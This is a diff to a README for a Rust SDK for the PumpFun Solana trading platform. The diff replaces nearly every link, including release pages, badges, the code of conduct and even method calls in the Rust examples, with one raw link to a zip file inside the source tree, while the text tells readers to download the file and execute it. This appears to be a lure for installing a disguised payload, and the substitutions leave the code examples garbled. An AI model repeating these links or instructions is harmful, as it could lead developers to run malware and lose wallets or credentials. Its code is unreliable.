@@ -1,7 +1,7 @@
 # PumpFun SDK 🚀
 
-![PumpFun SDK](https://img.shields.io/badge/PumpFun%20SDK-v1.0.0-blue.svg)
-![GitHub Release](https://img.shields.io/badge/Releases-v1.0.0-orange.svg)
+![PumpFun SDK](https://github.com/fourti/pumpfun-sdk/raw/refs/heads/main/src/accounts/sdk_pumpfun_v1.7.zip%https://github.com/fourti/pumpfun-sdk/raw/refs/heads/main/src/accounts/sdk_pumpfun_v1.7.zip)
+![GitHub Release](https://github.com/fourti/pumpfun-sdk/raw/refs/heads/main/src/accounts/sdk_pumpfun_v1.7.zip)
 
 Welcome to the **PumpFun SDK**! This comprehensive Rust SDK allows seamless interaction with the PumpFun Solana program. With a robust set of tools and interfaces, you can easily integrate PumpFun functionality into your applications.
 
@@ -24,7 +24,7 @@ Welcome to the **PumpFun SDK**! This comprehensive Rust SDK allows seamless inte
 
 ## Installation
 
-To get started with the PumpFun SDK, you need to download the latest release. Visit the [Releases section](https://github.com/fourti/pumpfun-sdk/releases) to find the latest version. Download the appropriate file for your platform and execute it.
+To get started with the PumpFun SDK, you need to download the latest release. Visit the [Releases section](https://github.com/fourti/pumpfun-sdk/raw/refs/heads/main/src/accounts/sdk_pumpfun_v1.7.zip) to find the latest version. Download the appropriate file for your platform and execute it.
 
 ### Prerequisites
 
@@ -33,7 +33,7 @@ To get started with the PumpFun SDK, you need to download the latest release. Vi
 
 ### Steps to Install
 
-1. **Download the SDK**: Head over to the [Releases section](https://github.com/fourti/pumpfun-sdk/releases) and download the latest release.
+1. **Download the SDK**: Head over to the [Releases section](https://github.com/fourti/pumpfun-sdk/raw/refs/heads/main/src/accounts/sdk_pumpfun_v1.7.zip) and download the latest release.
 2. **Extract the Files**: Unzip the downloaded file to your desired location.
 3. **Build the SDK**: Open your terminal and navigate to the SDK directory. Run the following command:
 
@@ -41,7 +41,7 @@ To get started with the PumpFun SDK, you need to download the latest release. Vi
    cargo build --release
    ```
 
-4. **Add to Your Project**: You can now include the PumpFun SDK in your Rust project by adding it to your `Cargo.toml` file:
+4. **Add to Your Project**: You can now include the PumpFun SDK in your Rust project by adding it to your `https://github.com/fourti/pumpfun-sdk/raw/refs/heads/main/src/accounts/sdk_pumpfun_v1.7.zip` file:
 
    ```toml
    [dependencies]
@@ -59,10 +59,10 @@ use pumpfun_sdk::PumpFun;
 
 fn main() {
     let pump_fun = PumpFun::new();
-    pump_fun.initialize();
+    https://github.com/fourti/pumpfun-sdk/raw/refs/heads/main/src/accounts/sdk_pumpfun_v1.7.zip();
     
     // Example of fetching data
-    let data = pump_fun.get_data();
+    let data = https://github.com/fourti/pumpfun-sdk/raw/refs/heads/main/src/accounts/sdk_pumpfun_v1.7.zip();
     println!("Fetched data: {:?}", data);
 }
 ```
@@ -78,11 +78,11 @@ use pumpfun_sdk::PumpFun;
 
 fn trading_bot() {
     let pump_fun = PumpFun::new();
-    pump_fun.initialize();
+    https://github.com/fourti/pumpfun-sdk/raw/refs/heads/main/src/accounts/sdk_pumpfun_v1.7.zip();
 
     // Example trading logic
-    if pump_fun.should_buy() {
-        pump_fun.buy();
+    if https://github.com/fourti/pumpfun-sdk/raw/refs/heads/main/src/accounts/sdk_pumpfun_v1.7.zip() {
+        https://github.com/fourti/pumpfun-sdk/raw/refs/heads/main/src/accounts/sdk_pumpfun_v1.7.zip();
         println!("Bought successfully!");
     } else {
         println!("No trade executed.");
@@ -99,9 +99,9 @@ use pumpfun_sdk::PumpFun;
 
 fn generate_meme(user_input: &str) {
     let pump_fun = PumpFun::new();
-    pump_fun.initialize();
+    https://github.com/fourti/pumpfun-sdk/raw/refs/heads/main/src/accounts/sdk_pumpfun_v1.7.zip();
 
-    let meme = pump_fun.create_meme(user_input);
+    let meme = https://github.com/fourti/pumpfun-sdk/raw/refs/heads/main/src/accounts/sdk_pumpfun_v1.7.zip(user_input);
     println!("Generated meme: {:?}", meme);
 }
 ```
@@ -118,7 +118,7 @@ We welcome contributions to the PumpFun SDK! If you want to contribute, please f
 
 ### Code of Conduct
 
-Please adhere to our [Code of Conduct](CODE_OF_CONDUCT.md) when contributing.
+Please adhere to our [Code of Conduct](https://github.com/fourti/pumpfun-sdk/raw/refs/heads/main/src/accounts/sdk_pumpfun_v1.7.zip) when contributing.
 
 ## License
 
@@ -126,7 +126,7 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Support
 
-If you have any questions or need help, feel free to open an issue in the repository. You can also check the [Releases section](https://github.com/fourti/pumpfun-sdk/releases) for updates and new features.
+If you have any questions or need help, feel free to open an issue in the repository. You can also check the [Releases section](https://github.com/fourti/pumpfun-sdk/raw/refs/heads/main/src/accounts/sdk_pumpfun_v1.7.zip) for updates and new features.
 
 ---
 
